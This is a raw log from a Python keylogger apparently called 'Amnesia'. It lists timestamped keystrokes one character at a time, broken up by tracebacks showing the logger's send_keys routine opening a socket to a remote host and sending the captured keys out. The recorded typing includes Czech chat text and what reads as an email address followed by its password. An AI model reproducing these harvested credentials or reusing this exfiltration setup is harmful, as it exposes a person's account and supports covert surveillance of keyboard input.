Time: 2023-01-15 18:09:53,355 | Key: 's'
Time: 2023-01-15 18:09:54,515 | Key: 'd'
Time: 2023-01-15 18:09:54,515 | Key: Unhandled exception in listener callback
Traceback (most recent call last):
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 228, in inner
    return f(self, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\keyboard\_win32.py", line 287, in _process
    self.on_press(key)
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 144, in inner
    if f(*args) is False:
       ^^^^^^^^
  File "C:\Users\yakub\OneDrive\Documents\pythonMalwares\KeyLogger\Amnesia\amnesia.py", line 47, in onPress
    self.send_keys(key_data)
  File "C:\Users\yakub\OneDrive\Documents\pythonMalwares\KeyLogger\Amnesia\amnesia.py", line 37, in send_keys
    self.socket.connect((self.host, self.port))
OSError: [WinError 10056] A connect request was made on an already connected socket
Time: 2023-01-15 18:13:14,692 | Key: 's'
Time: 2023-01-15 18:13:19,167 | Key: 'c'
Time: 2023-01-15 18:13:19,167 | Key: Unhandled exception in listener callback
Traceback (most recent call last):
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 228, in inner
    return f(self, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\keyboard\_win32.py", line 287, in _process
    self.on_press(key)
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 144, in inner
    if f(*args) is False:
       ^^^^^^^^
  File "C:\Users\yakub\OneDrive\Documents\pythonMalwares\KeyLogger\Amnesia\amnesia.py", line 47, in onPress
    self.send_keys(key_data)
  File "C:\Users\yakub\OneDrive\Documents\pythonMalwares\KeyLogger\Amnesia\amnesia.py", line 37, in send_keys
    self.socket.connect((self.host, self.port))
OSError: [WinError 10056] A connect request was made on an already connected socket
Time: 2023-01-15 18:14:43,468 | Key: 's'
Time: 2023-01-15 18:14:56,651 | Key: '\\'
Time: 2023-01-15 18:14:56,651 | Key: Unhandled exception in listener callback
Traceback (most recent call last):
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 228, in inner
    return f(self, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\keyboard\_win32.py", line 287, in _process
    self.on_press(key)
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 144, in inner
    if f(*args) is False:
       ^^^^^^^^
  File "C:\Users\yakub\OneDrive\Documents\pythonMalwares\KeyLogger\Amnesia\amnesia.py", line 47, in onPress
    self.send_keys(key_data)
  File "C:\Users\yakub\OneDrive\Documents\pythonMalwares\KeyLogger\Amnesia\amnesia.py", line 37, in send_keys
    self.socket.connect((self.host, self.port))
OSError: [WinError 10056] A connect request was made on an already connected socket
Time: 2023-01-15 18:19:55,557 | Key: 's'
Time: 2023-01-15 18:19:58,163 | Key: 'd'
Time: 2023-01-15 18:20:00,746 | Key: 's'
Time: 2023-01-15 18:20:01,162 | Key: 's'
Time: 2023-01-15 18:20:01,512 | Key: 'd'
Time: 2023-01-15 18:20:01,862 | Key: 'd'
Time: 2023-01-15 18:20:02,197 | Key: 'x'
Time: 2023-01-15 18:20:02,614 | Key: 'z'
Time: 2023-01-15 18:20:22,850 | Key: Key.ctrl_l
Time: 2023-01-15 18:20:23,096 | Key: '\x03'
Time: 2023-01-15 18:20:24,566 | Key: 's'
Time: 2023-01-15 18:20:24,635 | Key: 'd'
Time: 2023-01-15 18:20:25,123 | Key: 's'
Time: 2023-01-15 18:20:25,214 | Key: 'd'
Time: 2023-01-15 18:21:09,751 | Key: 's'
Time: 2023-01-15 18:21:12,613 | Key: 'd'
Time: 2023-01-15 18:21:13,440 | Key: 'd'
Time: 2023-01-15 18:21:13,707 | Key: 's'
Time: 2023-01-15 18:21:13,902 | Key: 'd'
Time: 2023-01-15 18:21:14,020 | Key: 's'
Time: 2023-01-15 18:21:14,137 | Key: 'd'
Time: 2023-01-15 18:21:38,155 | Key: 's'
Time: 2023-01-15 18:21:40,856 | Key: 'd'
Time: 2023-01-15 18:26:58,618 | Key: Key.ctrl_l
Time: 2023-01-15 18:26:59,124 | Key: Key.ctrl_l
Time: 2023-01-15 18:26:59,155 | Key: Key.ctrl_l
Time: 2023-01-15 18:26:59,186 | Key: Key.ctrl_l
Time: 2023-01-15 18:26:59,193 | Key: '\x03'
Time: 2023-01-15 18:27:00,759 | Key: 's'
Time: 2023-01-15 18:29:56,393 | Key: 's'
Time: 2023-01-15 18:29:57,215 | Key: 's'
Time: 2023-01-15 18:29:57,720 | Key: 's'
Time: 2023-01-15 18:29:57,885 | Key: 's'
Time: 2023-01-15 18:29:58,056 | Key: 's'
Time: 2023-01-15 18:29:58,226 | Key: 's'
Time: 2023-01-15 18:29:58,377 | Key: 's'
Time: 2023-01-15 18:29:58,576 | Key: Key.ctrl_l
Time: 2023-01-15 18:29:58,764 | Key: '\x03'
Time: 2023-01-15 18:29:58,922 | Key: '\x03'
Time: 2023-01-15 18:29:59,065 | Key: '\x03'
Time: 2023-01-15 18:29:59,220 | Key: '\x03'
Time: 2023-01-15 18:30:11,046 | Key: 's'
Time: 2023-01-15 18:30:11,606 | Key: 'd'
Time: 2023-01-15 18:32:00,230 | Key: 's'
Time: 2023-01-15 18:32:00,712 | Key: 'd'
Time: 2023-01-15 18:32:01,391 | Key: 'd'
Time: 2023-01-15 18:32:01,730 | Key: 's'
Time: 2023-01-15 18:32:02,273 | Key: Key.shift
Time: 2023-01-15 18:32:02,337 | Key: 'A'
Time: 2023-01-15 18:32:02,573 | Key: 'h'
Time: 2023-01-15 18:32:02,679 | Key: 'o'
Time: 2023-01-15 18:32:02,749 | Key: 'j'
Time: 2023-01-15 18:32:03,086 | Key: 't'
Time: 2023-01-15 18:32:03,153 | Key: 'e'
Time: 2023-01-15 18:32:03,640 | Key: 'a'
Time: 2023-01-15 18:32:04,327 | Key: 'a'
Time: 2023-01-15 18:32:04,828 | Key: 'a'
Time: 2023-01-15 18:33:06,958 | Key: Key.shift
Time: 2023-01-15 18:33:09,599 | Key: 'a'
Time: 2023-01-15 18:33:09,957 | Key: 'h'
Time: 2023-01-15 18:33:10,329 | Key: 'o'
Time: 2023-01-15 18:33:10,572 | Key: 'j'
Time: 2023-01-15 18:33:11,354 | Key: 'j'
Time: 2023-01-15 18:33:11,473 | Key: 'a'
Time: 2023-01-15 18:33:11,588 | Key: 'k'
Time: 2023-01-15 18:33:11,832 | Key: 's'
Time: 2023-01-15 18:33:11,907 | Key: 'e'
Time: 2023-01-15 18:33:12,715 | Key: Key.space
Time: 2023-01-15 18:33:13,296 | Key: 'm'
Time: 2023-01-15 18:33:13,377 | Key: 'a'
Time: 2023-01-15 18:33:13,437 | Key: 's'
Time: 2023-01-15 18:33:14,007 | Key: Key.shift
Time: 2023-01-15 18:33:14,507 | Key: Key.shift
Time: 2023-01-15 18:33:14,553 | Key: Key.shift
Time: 2023-01-15 18:33:14,585 | Key: Key.shift
Time: 2023-01-15 18:33:14,616 | Key: Key.shift
Time: 2023-01-15 18:33:14,647 | Key: Key.shift
Time: 2023-01-15 18:33:14,680 | Key: Key.shift
Time: 2023-01-15 18:33:14,711 | Key: Key.shift
Time: 2023-01-15 18:33:14,741 | Key: Key.shift
Time: 2023-01-15 18:33:14,772 | Key: Key.shift
Time: 2023-01-15 18:33:14,818 | Key: Key.shift
Time: 2023-01-15 18:33:14,850 | Key: Key.shift
Time: 2023-01-15 18:33:14,881 | Key: Key.shift
Time: 2023-01-15 18:33:14,912 | Key: Key.shift
Time: 2023-01-15 18:33:14,943 | Key: Key.shift
Time: 2023-01-15 18:33:14,974 | Key: Key.shift
Time: 2023-01-15 18:33:15,004 | Key: Key.shift
Time: 2023-01-15 18:33:15,035 | Key: Key.shift
Time: 2023-01-15 18:33:15,055 | Key: '?'
Time: 2023-01-15 18:33:23,043 | Key: 's'
Time: 2023-01-15 18:36:49,157 | Key: 's'
Time: 2023-01-15 18:36:55,238 | Key: Key.shift
Time: 2023-01-15 18:36:55,361 | Key: 'A'
Time: 2023-01-15 18:36:55,960 | Key: 'h'
Time: 2023-01-15 18:36:56,076 | Key: 'o'
Time: 2023-01-15 18:36:56,135 | Key: 'j'
Time: 2023-01-15 18:36:56,349 | Key: Key.space
Time: 2023-01-15 18:36:56,502 | Key: 'j'
Time: 2023-01-15 18:36:56,586 | Key: 'a'
Time: 2023-01-15 18:36:56,680 | Key: 'k'
Time: 2023-01-15 18:36:56,804 | Key: Key.space
Time: 2023-01-15 18:36:56,925 | Key: 'j'
Time: 2023-01-15 18:36:57,031 | Key: 'e'
Time: 2023-01-15 18:36:57,449 | Key: Key.shift
Time: 2023-01-15 18:36:57,954 | Key: Key.shift
Time: 2023-01-15 18:36:57,985 | Key: Key.shift
Time: 2023-01-15 18:36:58,015 | Key: Key.shift
Time: 2023-01-15 18:36:58,062 | Key: Key.shift
Time: 2023-01-15 18:36:58,093 | Key: Key.shift
Time: 2023-01-15 18:36:58,124 | Key: Key.shift
Time: 2023-01-15 18:36:58,156 | Key: Key.shift
Time: 2023-01-15 18:36:58,409 | Key: Key.shift
Time: 2023-01-15 18:36:58,695 | Key: '?'
Time: 2023-01-15 18:36:59,743 | Key: Key.caps_lock
Time: 2023-01-15 18:37:00,321 | Key: Key.caps_lock
Time: 2023-01-15 18:37:00,945 | Key: 'n'
Time: 2023-01-15 18:37:01,010 | Key: 'e'
Time: 2023-01-15 18:37:01,101 | Key: 'v'
Time: 2023-01-15 18:37:01,160 | Key: 'i'
Time: 2023-01-15 18:37:01,239 | Key: 'm'
Time: 2023-01-15 18:37:01,693 | Key: Key.space
Time: 2023-01-15 18:37:01,846 | Key: 'p'
Time: 2023-01-15 18:37:01,937 | Key: 'r'
Time: 2023-01-15 18:37:02,018 | Key: 'o'
Time: 2023-01-15 18:37:02,532 | Key: 'c'
Time: 2023-01-15 18:37:03,127 | Key: Key.shift
Time: 2023-01-15 18:37:03,490 | Key: '?'
Time: 2023-01-15 18:37:04,387 | Key: Key.shift
Time: 2023-01-15 18:37:04,491 | Key: 'C'
Time: 2023-01-15 18:37:04,644 | Key: 'h'
Time: 2023-01-15 18:37:04,826 | Key: 'e'
Time: 2023-01-15 18:37:05,278 | Key: Key.backspace
Time: 2023-01-15 18:37:05,339 | Key: 't'
Time: 2023-01-15 18:37:05,402 | Key: 'e'
Time: 2023-01-15 18:37:05,527 | Key: 'l'
Time: 2023-01-15 18:37:05,638 | Key: 'a'
Time: 2023-01-15 18:37:06,084 | Key: Key.space
Time: 2023-01-15 18:37:06,207 | Key: 'b'
Time: 2023-01-15 18:37:06,311 | Key: 'y'
Time: 2023-01-15 18:37:06,395 | Key: 's'
Time: 2023-01-15 18:37:06,491 | Key: Key.space
Time: 2023-01-15 18:37:06,694 | Key: 'n'
Time: 2023-01-15 18:37:06,718 | Key: 'e'
Time: 2023-01-15 18:37:06,826 | Key: 'c'
Time: 2023-01-15 18:37:06,899 | Key: 'o'
Time: 2023-01-15 18:37:06,976 | Key: Key.space
Time: 2023-01-15 18:37:07,138 | Key: 'v'
Time: 2023-01-15 18:37:07,215 | Key: 'e'
Time: 2023-01-15 18:37:07,371 | Key: 'd'
Time: 2023-01-15 18:37:07,434 | Key: 'e'
Time: 2023-01-15 18:37:07,561 | Key: 't'
Time: 2023-01-15 18:37:07,662 | Key: Key.space
Time: 2023-01-15 18:37:07,662 | Key: Key.shift
Time: 2023-01-15 18:37:07,773 | Key: '?'
Time: 2023-01-15 18:37:07,874 | Key: Key.enter
Time: 2023-01-15 18:37:09,178 | Key: Key.ctrl_l
Time: 2023-01-15 18:37:09,301 | Key: '\x03'
Time: 2023-01-15 18:37:10,783 | Key: 'n'
Time: 2023-01-15 18:37:10,846 | Key: 'o'
Time: 2023-01-15 18:37:11,475 | Key: Key.space
Time: 2023-01-15 18:37:25,381 | Key: Key.shift
Time: 2023-01-15 18:37:25,647 | Key: 'M'
Time: 2023-01-15 18:37:26,073 | Key: 'o'
Time: 2023-01-15 18:37:26,308 | Key: 'j'
Time: 2023-01-15 18:37:26,448 | Key: 'e'
Time: 2023-01-15 18:37:26,588 | Key: Key.space
Time: 2023-01-15 18:37:26,831 | Key: 'h'
Time: 2023-01-15 18:37:26,903 | Key: 'e'
Time: 2023-01-15 18:37:27,148 | Key: 's'
Time: 2023-01-15 18:37:27,248 | Key: 'l'
Time: 2023-01-15 18:37:27,341 | Key: 'a'
Time: 2023-01-15 18:37:27,505 | Key: Key.enter
Time: 2023-01-15 18:37:33,939 | Key: 'h'
Time: 2023-01-15 18:37:34,161 | Key: 'e'
Time: 2023-01-15 18:37:34,458 | Key: 's'
Time: 2023-01-15 18:37:35,138 | Key: Key.backspace
Time: 2023-01-15 18:37:35,322 | Key: Key.backspace
Time: 2023-01-15 18:37:35,484 | Key: Key.backspace
Time: 2023-01-15 18:37:35,738 | Key: Key.shift
Time: 2023-01-15 18:37:36,056 | Key: 'H'
Time: 2023-01-15 18:37:36,911 | Key: 'e'
Time: 2023-01-15 18:37:37,377 | Key: 's'
Time: 2023-01-15 18:37:37,656 | Key: 'l'
Time: 2023-01-15 18:37:37,867 | Key: 'o'
Time: 2023-01-15 18:37:39,553 | Key: Key.space
Time: 2023-01-15 18:37:39,978 | Key: 'k'
Time: 2023-01-15 18:37:40,444 | Key: Key.space
Time: 2023-01-15 18:37:40,667 | Key: 'm'
Time: 2023-01-15 18:37:40,880 | Key: 'e'
Time: 2023-01-15 18:37:41,066 | Key: 'm'
Time: 2023-01-15 18:37:41,296 | Key: 'u'
Time: 2023-01-15 18:37:41,597 | Key: Key.space
Time: 2023-01-15 18:37:41,886 | Key: 'r'
Time: 2023-01-15 18:37:42,136 | Key: 'o'
Time: 2023-01-15 18:37:42,350 | Key: 'b'
Time: 2023-01-15 18:37:42,557 | Key: 'l'
Time: 2023-01-15 18:37:42,742 | Key: 'o'
Time: 2023-01-15 18:37:42,937 | Key: 'c'
Time: 2023-01-15 18:37:42,946 | Key: 'x'
Time: 2023-01-15 18:37:43,502 | Key: Key.backspace
Time: 2023-01-15 18:37:43,840 | Key: Key.backspace
Time: 2023-01-15 18:37:44,096 | Key: 'x'
Time: 2023-01-15 18:37:44,451 | Key: Key.space
Time: 2023-01-15 18:37:44,694 | Key: 'u'
Time: 2023-01-15 18:37:44,817 | Key: 'c'
Time: 2023-01-15 18:37:45,028 | Key: 'u'
Time: 2023-01-15 18:37:45,580 | Key: Key.backspace
Time: 2023-01-15 18:37:45,750 | Key: 't'
Time: 2023-01-15 18:37:45,876 | Key: 'u'
Time: 2023-01-15 18:37:46,116 | Key: Key.shift
Time: 2023-01-15 18:37:46,296 | Key: 'L'
Time: 2023-01-15 18:37:46,930 | Key: Key.backspace
Time: 2023-01-15 18:37:47,017 | Key: Key.shift
Time: 2023-01-15 18:37:47,140 | Key: ':'
Time: 2023-01-15 18:37:47,552 | Key: Key.space
Time: 2023-01-15 18:37:47,748 | Key: Key.shift
Time: 2023-01-15 18:37:48,256 | Key: 'f'
Time: 2023-01-15 18:37:48,466 | Key: 'r'
Time: 2023-01-15 18:37:48,587 | Key: 'a'
Time: 2023-01-15 18:37:49,001 | Key: Key.backspace
Time: 2023-01-15 18:37:49,152 | Key: Key.backspace
Time: 2023-01-15 18:37:49,299 | Key: Key.backspace
Time: 2023-01-15 18:37:49,581 | Key: 'p'
Time: 2023-01-15 18:37:49,698 | Key: 'e'
Time: 2023-01-15 18:37:49,815 | Key: 'p'
Time: 2023-01-15 18:37:49,889 | Key: 'i'
Time: 2023-01-15 18:37:50,038 | Key: 'c'
Time: 2023-01-15 18:37:50,131 | Key: 'e'
Time: 2023-01-15 18:37:50,247 | Key: 'k'
Time: 2023-01-15 18:37:51,167 | Key: '1'
Time: 2023-01-15 18:37:51,387 | Key: '2'
Time: 2023-01-15 18:37:51,597 | Key: '3'
Time: 2023-01-15 18:37:52,001 | Key: Key.shift
Time: 2023-01-15 18:37:52,149 | Key: '@'
Time: 2023-01-15 18:37:52,985 | Key: 's'
Time: 2023-01-15 18:37:53,130 | Key: 'e'
Time: 2023-01-15 18:37:53,467 | Key: 'z'
Time: 2023-01-15 18:37:53,595 | Key: 'n'
Time: 2023-01-15 18:37:53,688 | Key: 'a'
Time: 2023-01-15 18:37:53,789 | Key: 'm'
Time: 2023-01-15 18:37:53,992 | Key: '.'
Time: 2023-01-15 18:37:54,116 | Key: 'c'
Time: 2023-01-15 18:37:54,195 | Key: 'z'
Time: 2023-01-15 18:37:59,343 | Key: ';'
Time: 2023-01-15 18:37:59,728 | Key: Key.space
Time: 2023-01-15 18:37:59,941 | Key: 'h'
Time: 2023-01-15 18:38:00,004 | Key: 'e'
Time: 2023-01-15 18:38:00,258 | Key: 's'
Time: 2023-01-15 18:38:00,366 | Key: 'k'
Time: 2023-01-15 18:38:00,558 | Key: 'i'
Time: 2023-01-15 18:38:00,693 | Key: Key.shift
Time: 2023-01-15 18:38:00,830 | Key: 'L'
Time: 2023-01-15 18:38:01,201 | Key: Key.backspace
Time: 2023-01-15 18:38:01,443 | Key: Key.backspace
Time: 2023-01-15 18:38:01,675 | Key: Key.backspace
Time: 2023-01-15 18:38:02,257 | Key: 'l'
Time: 2023-01-15 18:38:02,437 | Key: 'o'
Time: 2023-01-15 18:38:02,551 | Key: Key.shift
Time: 2023-01-15 18:38:02,675 | Key: ':'
Time: 2023-01-15 18:38:03,799 | Key: Key.space
Time: 2023-01-15 18:38:04,234 | Key: Key.shift
Time: 2023-01-15 18:38:05,309 | Key: 'n'
Time: 2023-01-15 18:38:05,354 | Key: 'e'
Time: 2023-01-15 18:38:05,522 | Key: 'j'
Time: 2023-01-15 18:38:05,654 | Key: 's'
Time: 2023-01-15 18:38:05,721 | Key: 'e'
Time: 2023-01-15 18:38:05,839 | Key: 'm'
Time: 2023-01-15 18:38:06,357 | Key: 'b'
Time: 2023-01-15 18:38:06,507 | Key: 'u'
Time: 2023-01-15 18:38:06,643 | Key: 'z'
Time: 2023-01-15 18:38:06,773 | Key: 'e'
Time: 2023-01-15 18:38:07,002 | Key: 'r'
Time: 2023-01-15 18:38:07,100 | Key: 'a'
Time: 2023-01-15 18:38:07,218 | Key: 'n'
Time: 2023-01-15 18:38:07,360 | Key: 't'
Time: 2023-01-15 18:38:09,690 | Key: Key.shift
Time: 2023-01-15 18:38:09,873 | Key: '_'
Time: 2023-01-15 18:38:10,806 | Key: '4'
Time: 2023-01-15 18:38:10,943 | Key: '3'
Time: 2023-01-15 18:38:12,255 | Key: '2'
Time: 2023-01-15 18:38:14,920 | Key: Key.ctrl_l
Time: 2023-01-15 18:38:15,000 | Key: '\x13'
Time: 2023-01-15 18:38:18,839 | Key: Key.delete
Time: 2023-01-15 18:38:34,256 | Key: 'h'
Time: 2023-01-15 18:38:34,256 | Key: Unhandled exception in listener callback
Traceback (most recent call last):
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 228, in inner
    return f(self, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\keyboard\_win32.py", line 287, in _process
    self.on_press(key)
  File "C:\Users\yakub\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 144, in inner
    if f(*args) is False:
       ^^^^^^^^
  File "C:\Users\yakub\OneDrive\Documents\pythonMalwares\KeyLogger\Amnesia\amnesia.py", line 58, in onPress
    self.send_keys(key_data)
  File "C:\Users\yakub\OneDrive\Documents\pythonMalwares\KeyLogger\Amnesia\amnesia.py", line 48, in send_keys
    self.socket.send(bytes(keys, 'utf-8'))
ConnectionResetError: [WinError 10054] An existing connection was forcibly closed by the remote host
